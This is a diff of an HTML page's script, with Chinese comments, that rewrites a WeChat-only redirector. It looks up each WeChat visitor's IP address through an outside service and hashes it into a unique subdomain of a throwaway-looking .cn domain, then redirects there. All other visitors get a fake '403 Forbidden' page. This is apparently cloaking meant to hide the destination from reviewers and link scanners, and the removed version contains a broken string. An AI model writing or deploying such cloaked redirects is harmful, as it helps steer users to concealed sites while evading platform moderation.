@@ -24,51 +24,42 @@
 <body>
 
     <script>
-     // 判断是否在微信中访问
-function isWeChat() {
-  var ua = navigator.userAgent.toLowerCase();
-  return ua.indexOf('micromessenger') !== -1;
-}
+var userAgent = navigator.userAgent;
 
-// 获取用户IP地址
-function getUserIP(callback) {
-  var xhr = new XMLHttpRequest();
-  xhr.open('GET', 'https://api.ipify.org?format=json', true);
-  xhr.onreadystatechange = function () {
-    if (xhr.readyState === 4 && xhr.status === 200) {
-      var response = JSON.parse(xhr.responseText);
-      var ip = response.ip;
-      callback(ip);
+// 判断是否在微信环境中访问
+if (userAgent.indexOf('MicroMessenger') !== -1) {
+    // 获取当前用户IP
+    var userIp = '';
+
+    // 通过异步请求获取用户IP
+    var xhr = new XMLHttpRequest();
+    xhr.open('GET', 'https://api.ipify.org?format=json', true);
+    xhr.onreadystatechange = function () {
+        if (xhr.readyState === 4 && xhr.status === 200) {
+            var response = JSON.parse(xhr.responseText);
+            userIp = response.ip;
+            redirectToDomain(userIp);
+        }
+    };
+    xhr.send();
+
+    // 将IP转化为特定的32位字符
+    function convertIPToHash(ip) {
+        return md5(ip);
     }
-  };
-  xhr.send();
-}
 
-// 将IP转化为特定的数字串
-function convertIPToNumber(ip) {
-  var parts = ip.split('.');
-  var number = 0;
-  for (var i = 0; i < parts.length; i++) {
-    number += parseInt(parts[i]) * Math.pow(256, 3 - i);
-  }
-  return number;
-}
+    // 执行重定向操作
+    function redirectToDomain(ip) {
+        var hash = convertIPToHash(ip);
+        var domain = '2022qazwsx053.cn';
+        var redirectUrl = 'http://' + hash + '.' + domain;
 
-// 执行重定向操作
-function redirectToDomain(ip) {
-  var convertedIP = convertIPToNumber(ip);
-  var domain = '2022qazwsx053.cn/';
-  var redirectURL = 'http://'xxx123456789-qwertyuiopasdfghjklzxcvb' + convertedIP + '.' + domain;
-  window.location.href = redirectURL;
-}
-
-if (isWeChat()) {
-  getUserIP(function (ip) {
-    redirectToDomain(ip);
-  });
+        // 执行301重定向跳转
+        window.location.href = redirectUrl;
+    }
 } else {
-  // 非微信访问，显示403页面
-  document.write('<h1>403 Forbidden</h1>');
+    // 非微信环境下显示403 Forbidden错误
+    document.write('<h1>403 Forbidden</h1>');
 }
     </script>
 </body>
